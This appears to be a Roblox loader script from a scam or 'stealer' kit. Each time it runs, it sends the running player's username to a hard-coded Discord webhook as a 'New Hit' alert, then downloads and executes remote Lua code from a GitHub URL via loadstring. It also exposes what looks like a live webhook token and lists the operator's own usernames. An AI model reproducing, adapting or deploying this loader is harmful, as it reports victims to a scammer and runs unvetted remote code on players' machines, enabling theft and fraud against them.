-- Final Loader (GUI + Discord Ping)

_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"

_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- ← Change this to your real Roblox usernames

_G.PING_POOR = true

-- Send Discord ping
task.spawn(function()
    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
        local http = game:GetService("HttpService")
        local plr = game.Players.LocalPlayer
        local message = "@everyone New Hit! Username: " .. plr.Name
        game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode({content = message}))
    end
end)

-- Load the GUI
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/test/refs/heads/main/gui.lua", true))()
end)
